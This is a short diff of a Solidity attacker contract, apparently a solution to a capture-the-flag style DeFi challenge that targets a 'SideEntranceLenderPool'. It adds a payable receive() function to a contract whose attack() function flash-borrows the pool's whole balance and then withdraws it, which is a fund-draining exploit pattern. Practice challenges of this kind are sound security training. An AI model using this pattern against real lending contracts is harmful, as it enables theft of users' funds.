@@ -9,6 +9,9 @@
     constructor(address _pool) {
         pool = SideEntranceLenderPool(_pool);
     }
+
+    receive() external payable {}
+    
     function attack() external {
         pool.flashLoan(address(pool).balance);
         pool.withdraw();
